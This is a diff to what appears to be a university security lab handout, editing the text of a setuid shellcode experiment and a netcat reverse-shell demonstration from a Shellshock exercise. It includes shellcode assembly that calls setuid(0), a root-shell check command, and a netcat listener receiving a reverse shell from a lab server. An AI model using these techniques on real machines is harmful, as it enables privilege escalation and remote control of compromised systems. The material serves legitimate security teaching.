@@ -396,11 +396,13 @@ The following assembly code shows how to invoke setuid(0). The binary code is al
 
 xor rdi, rdi ; rdi = 0: setuid()'s argument xor rax, rax mov al, 0x69 ; setuid()'s system call number syscall
 ```
-**Experiment.** Compile callshellcode.c into root-owned binary (by typing "make setuid"). Run the shellcode a32.out and a64.out with or without the setuid(0) system call. Please describe and explain your observations.
-
-**Launching the attack again.** Now, using the updated shellcode, we can attempt the attack again on the vulnerable program, and this time, with the shell's countermeasure turned on. Repeat your attack on Level 1, and see whether you can get the root shell. After getting the root shell, please run the following command to prove that the countermeasure is turned on.
+**Experiment.** Compile callshellcode.c into root-owned binary (by typing `make setuid`). Run the shellcode a32.out and a64.out with or without the setuid(0) system call. After getting the shell, run the following command. Describe and explain your observations.
 ```
-\# ls -l /bin/sh /bin/zsh /bin/dash
+# id; ls -l /bin/sh /bin/zsh /bin/dash
+```
+**Launching the attack again.** Now, using the updated shellcode, we can attempt the attack again on the vulnerable program, and this time, with the shell's countermeasure turned on. Repeat your attack on Level 1, and see whether you can get the root shell. After getting the root shell,  run the following command to prove that the countermeasure is turned on.
+```
+# id; ls -l /bin/sh /bin/zsh /bin/dash
 ```
 
 ## 8) Task 8 (5pts): Defeating Address Randomization
@@ -726,10 +728,12 @@ A commonly used program by attackers is netcat, which, if running with the "-l" 
 
 ```bash
 Attacker(10.0.2.6):$ nc -nv -l 9090 # Waiting for reverse shell
-Listening on 0.0.0.0 9090Connection received on 10.0.2.5 39452
+Listening on 0.0.0.0 9090
+Connection received on 10.0.2.5 39452
 Server(10.0.2.5):$  # Reverse shell from 10.0.2.5.
 Server(10.0.2.5):$ ifconfig
-ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 10.0.2.5 netmask 255.255.255.0 broadcast 10.0.2.255 ...
+ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
+mtu 1500 inet 10.0.2.5 netmask 255.255.255.0 broadcast 10.0.2.255 ...
 ```
 
 The above nc command will block, waiting for a connection. We now directly run the following bash program on the Server machine (10.0.2.5) to emulate what attackers would run after compromising the server via the Shellshock attack. This bash command will trigger a TCP connection to the attacker machine's port 9090, and a reverse shell will be created. We can see the shell prompt from the above result, indicating that the shell is running on the Server machine; we can type the ifconfig command to verify that the IP address is indeed 10.0.2.5, the one belonging to the Server machine. Here is the bash command:
